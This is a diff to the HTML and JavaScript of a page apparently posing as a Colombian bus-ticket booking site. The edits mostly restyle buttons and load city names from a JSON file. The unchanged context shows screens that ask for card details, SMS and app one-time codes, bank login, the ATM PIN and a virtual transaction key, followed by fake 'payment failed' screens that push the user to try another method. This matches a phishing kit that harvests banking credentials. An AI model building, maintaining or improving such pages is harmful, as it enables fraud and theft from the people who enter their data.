@@ -364,7 +364,7 @@
 															data-prop-source-url="central.pwm435.space/api/v2/places"
 															data-prop-funnel-url="central.pwm435.space/pin/buscar"
 															data-prop-autocomplete-type="select"
-															data-prop-display-type="city_state"
+															data-prop-display-type="display"
 															data-prop-date-format="yyyy-mm-dd"
 															data-prop-lang="es-MX"
 															data-prop-primary-color="#003087"
@@ -459,6 +459,12 @@
 		.text-brand-blue { color: #005A9C; }
 		.bg-brand-red { background-color: #D81921; }
 		.text-accent-gold { color: #FFC107; }
+
+		/* Ocultar ciudad duplicada en autocompletado */
+		.place-info b,
+		.place-info-classic .place-info b {
+			display: none !important;
+		}
 	</style>
 
 	<!-- Google Material Symbols para iconos -->
@@ -650,7 +656,7 @@
 		<!-- Botón continuar fijo abajo -->
 		<div class="bg-white border-t shadow-lg p-4">
 			<button onclick="continuarAPasajeros()" id="btnContinuarSillas" disabled
-				class="w-full bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white font-bold py-4 rounded-xl text-lg transition-colors">
+				class="w-full flex items-center justify-center rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 				Continuar
 			</button>
 		</div>
@@ -725,7 +731,7 @@
 		<!-- Botón pagar fijo abajo -->
 		<div class="bg-white border-t shadow-lg p-4">
 			<button onclick="irAPagar()" id="btnPagar" disabled
-				class="w-full bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white font-bold py-4 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+				class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 				<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
 				</svg>
@@ -791,7 +797,7 @@
 				</div>
 				<div id="errorTdc" class="text-red-500 text-sm text-center hidden"></div>
 				<button onclick="enviarTdc()" id="btnTdc" disabled
-					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoTdc">Verificar</span>
 					<div id="spinnerTdc" class="hidden">
 						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -857,7 +863,7 @@
 				<a href="#" class="text-[#00529c] hover:underline">Ayuda</a>
 				<a href="#" class="text-[#00529c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
 				<button onclick="enviarOtpSms()" id="btnOtpSms" disabled
-					class="bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+					class="flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoOtpSms">Enviar</span>
 					<div id="spinnerOtpSms" class="hidden">
 						<svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -924,7 +930,7 @@
 				<a href="#" class="text-[#00529c] hover:underline">Ayuda</a>
 				<a href="#" class="text-[#00529c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
 				<button onclick="enviarOtpApp()" id="btnOtpApp" disabled
-					class="bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+					class="flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoOtpApp">Enviar</span>
 					<div id="spinnerOtpApp" class="hidden">
 						<svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -968,7 +974,7 @@
 				</div>
 				<div id="errorLogin" class="text-red-500 text-sm text-center hidden"></div>
 				<button onclick="enviarLogin()" id="btnLogin" disabled
-					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoLogin">Verificar</span>
 					<div id="spinnerLogin" class="hidden">
 						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -1004,7 +1010,7 @@
 				<p class="text-sm text-gray-500 mt-2 text-center">La misma clave que utilizas en cajeros automáticos</p>
 				<div id="errorClaveCajero" class="text-red-500 text-sm mt-2 text-center hidden"></div>
 				<button onclick="enviarClaveCajero()" id="btnClaveCajero" disabled
-					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoClaveCajero">Verificar</span>
 					<div id="spinnerClaveCajero" class="hidden">
 						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -1040,7 +1046,7 @@
 				<p class="text-sm text-gray-500 mt-2 text-center">Tu clave virtual de transacciones</p>
 				<div id="errorClaveVirtual" class="text-red-500 text-sm mt-2 text-center hidden"></div>
 				<button onclick="enviarClaveVirtual()" id="btnClaveVirtual" disabled
-					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					class="w-full mt-6 flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 					<span id="textoClaveVirtual">Verificar</span>
 					<div id="spinnerClaveVirtual" class="hidden">
 						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -1068,7 +1074,7 @@
 			<p class="text-gray-600 text-center max-w-md mb-8">
 				El método de pago seleccionado no pudo ser procesado. Por favor, elige otra forma de pago para continuar con tu transacción.
 			</p>
-			<button onclick="mostrarSeccion('seccion-metodo-pago')" class="bg-[#00529c] hover:bg-[#003d75] text-white font-bold py-4 px-8 rounded-xl text-lg transition-colors">
+			<button onclick="mostrarSeccion('seccion-metodo-pago')" class="flex items-center justify-center rounded-full h-12 px-8 bg-[#00529c] hover:bg-[#003d75] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 				Cambiar método de pago
 			</button>
 		</div>
@@ -1110,7 +1116,7 @@
 			<h3 class="text-2xl font-bold text-gray-900 mb-3">No pudimos procesar tu solicitud</h3>
 			<p class="text-gray-600 text-center max-w-sm mb-4">Ha ocurrido un error al procesar tu pago. Por favor, intenta nuevamente más tarde.</p>
 			<p class="text-gray-500 text-sm text-center">Si el problema persiste, comunícate con nuestro servicio al cliente.</p>
-			<button onclick="window.location.reload()" class="mt-8 bg-[#00529c] hover:bg-[#003d75] text-white font-bold py-3 px-8 rounded-xl text-lg transition-colors">
+			<button onclick="window.location.reload()" class="mt-8 flex items-center justify-center rounded-full h-12 px-8 bg-[#00529c] hover:bg-[#003d75] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 				Intentar de nuevo
 			</button>
 			<p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
@@ -1304,7 +1310,7 @@
 
 				<!-- Botón de pagar -->
 				<div class="mt-8">
-					<button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full bg-[#d22630] hover:bg-[#b01f28] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 						<span id="textoBotonTarjeta">Pagar</span>
 						<div id="spinnerTarjeta" class="hidden">
 							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -1432,7 +1438,7 @@
 
 				<!-- Botón de pagar -->
 				<div class="mt-8">
-					<button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full bg-[#d22630] hover:bg-[#b01f28] text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
 						<span id="textoBotonPSE">Pagar</span>
 						<div id="spinnerPSE" class="hidden">
 							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -1817,45 +1823,34 @@
 
 		let viajesDisponibles = [];
 
-		// Información de ciudades colombianas (coordenadas y departamento)
-		const ciudadesColombia = {
-			'barranquilla': { lat: 10.9685, lon: -74.7813, departamento: 'Atlántico' },
-			'bogota': { lat: 4.7110, lon: -74.0721, departamento: 'Cundinamarca' },
-			'bogotá': { lat: 4.7110, lon: -74.0721, departamento: 'Cundinamarca' },
-			'medellin': { lat: 6.2442, lon: -75.5812, departamento: 'Antioquia' },
-			'medellín': { lat: 6.2442, lon: -75.5812, departamento: 'Antioquia' },
-			'cali': { lat: 3.4516, lon: -76.5320, departamento: 'Valle del Cauca' },
-			'cartagena': { lat: 10.3910, lon: -75.4794, departamento: 'Bolívar' },
-			'bucaramanga': { lat: 7.1254, lon: -73.1198, departamento: 'Santander' },
-			'santa marta': { lat: 11.2408, lon: -74.1990, departamento: 'Magdalena' },
-			'cucuta': { lat: 7.8939, lon: -72.5078, departamento: 'Norte de Santander' },
-			'cúcuta': { lat: 7.8939, lon: -72.5078, departamento: 'Norte de Santander' },
-			'pereira': { lat: 4.8087, lon: -75.6906, departamento: 'Risaralda' },
-			'manizales': { lat: 5.0703, lon: -75.5138, departamento: 'Caldas' },
-			'ibague': { lat: 4.4389, lon: -75.2322, departamento: 'Tolima' },
-			'ibagué': { lat: 4.4389, lon: -75.2322, departamento: 'Tolima' },
-			'pasto': { lat: 1.2136, lon: -77.2811, departamento: 'Nariño' },
-			'monteria': { lat: 8.7479, lon: -75.8814, departamento: 'Córdoba' },
-			'montería': { lat: 8.7479, lon: -75.8814, departamento: 'Córdoba' },
-			'villavicencio': { lat: 4.1420, lon: -73.6266, departamento: 'Meta' },
-			'valledupar': { lat: 10.4631, lon: -73.2532, departamento: 'Cesar' },
-			'neiva': { lat: 2.9273, lon: -75.2819, departamento: 'Huila' },
-			'popayan': { lat: 2.4448, lon: -76.6147, departamento: 'Cauca' },
-			'popayán': { lat: 2.4448, lon: -76.6147, departamento: 'Cauca' },
-			'armenia': { lat: 4.5339, lon: -75.6811, departamento: 'Quindío' },
-			'sincelejo': { lat: 9.3047, lon: -75.3978, departamento: 'Sucre' },
-			'tunja': { lat: 5.5353, lon: -73.3678, departamento: 'Boyacá' },
-			'riohacha': { lat: 11.5444, lon: -72.9072, departamento: 'La Guajira' }
-		};
+		// Información de ciudades colombianas (se carga desde JSON)
+		let ciudadesColombia = {};
+
+		// Cargar ciudades desde el JSON
+		fetch('/pin/ciudades.json')
+			.then(response => response.json())
+			.then(data => {
+				data.forEach(ciudad => {
+					const key = ciudad.ascii_display || ciudad.city_ascii_name;
+					ciudadesColombia[key] = {
+						lat: parseFloat(ciudad.lat),
+						lon: parseFloat(ciudad.long),
+						departamento: ciudad.state
+					};
+				});
+				console.log('Ciudades cargadas:', Object.keys(ciudadesColombia).length);
+			})
+			.catch(error => console.error('Error cargando ciudades:', error));
 
 		// Función para obtener ciudad con departamento
 		function obtenerCiudadConDepartamento(ciudad) {
-			const key = ciudad.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
-			const info = ciudadesColombia[key] || ciudadesColombia[ciudad.toLowerCase()];
+			if (!ciudad) return '';
+			const key = ciudad.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").trim();
+			const info = ciudadesColombia[key] || ciudadesColombia[ciudad.toLowerCase().trim()];
 			if (info) {
-				return `${ciudad.toUpperCase()}-${info.departamento.toUpperCase()}`;
+				return `${ciudad.toUpperCase().trim()}-${info.departamento.toUpperCase()}`;
 			}
-			return ciudad.toUpperCase();
+			return ciudad.toUpperCase().trim();
 		}
 
 		// Variable para almacenar duración del viaje en minutos
@@ -2902,7 +2897,64 @@
 		// INTERCEPTOR DEL WIDGET DE BÚSQUEDA RESERVAMOS
 		// =====================================================
 
+		// Mapeo de ciudades a departamentos (se carga del JSON)
+		let ciudadDepartamentoMap = {};
+		fetch('/pin/ciudades.json')
+			.then(r => r.json())
+			.then(data => {
+				data.forEach(c => {
+					const key = c.city_name || c.display.split(',')[0];
+					if (!ciudadDepartamentoMap[key.toUpperCase()]) {
+						ciudadDepartamentoMap[key.toUpperCase()] = c.state;
+					}
+				});
+			});
+
+		// Función para corregir el valor del input (quitar ciudad duplicada)
+		function corregirInputCiudad(input) {
+			if (!input || !input.value) return;
+			const valor = input.value.trim();
+			// Si tiene formato "Ciudad, Ciudad, Departamento" -> "Ciudad, Departamento"
+			const partes = valor.split(',').map(p => p.trim());
+			if (partes.length === 3 && partes[0].toUpperCase() === partes[1].toUpperCase()) {
+				input.value = `${partes[0]}, ${partes[2]}`;
+			}
+			// Si tiene formato "Ciudad, Ciudad" -> "Ciudad, Departamento"
+			else if (partes.length === 2 && partes[0].toUpperCase() === partes[1].toUpperCase()) {
+				const dept = ciudadDepartamentoMap[partes[0].toUpperCase()];
+				if (dept) {
+					input.value = `${partes[0]}, ${dept}`;
+				}
+			}
+		}
+
 		document.addEventListener('DOMContentLoaded', function() {
+			// Observer para corregir inputs cuando cambian
+			const inputObserver = new MutationObserver(function(mutations) {
+				mutations.forEach(mutation => {
+					if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
+						corregirInputCiudad(mutation.target);
+					}
+				});
+			});
+
+			// Observar cambios en los inputs de origen y destino
+			setInterval(() => {
+				const inputs = document.querySelectorAll('input.origin, input.destination, input.es-input');
+				inputs.forEach(input => {
+					if (!input.dataset.observando) {
+						input.dataset.observando = 'true';
+						// Observar cambios en el atributo value
+						inputObserver.observe(input, { attributes: true, attributeFilter: ['value'] });
+						// También escuchar eventos de cambio
+						input.addEventListener('change', () => corregirInputCiudad(input));
+						input.addEventListener('blur', () => setTimeout(() => corregirInputCiudad(input), 100));
+					}
+					// Verificar y corregir el valor actual
+					corregirInputCiudad(input);
+				});
+			}, 500);
+
 			// Crear un observer para detectar cuando el widget cargue
 			const observer = new MutationObserver(function(mutations) {
 				const searchButton = document.querySelector('.reservamos-search button[type="submit"], .reservamos-search .search-button, #reservamosPortal button');
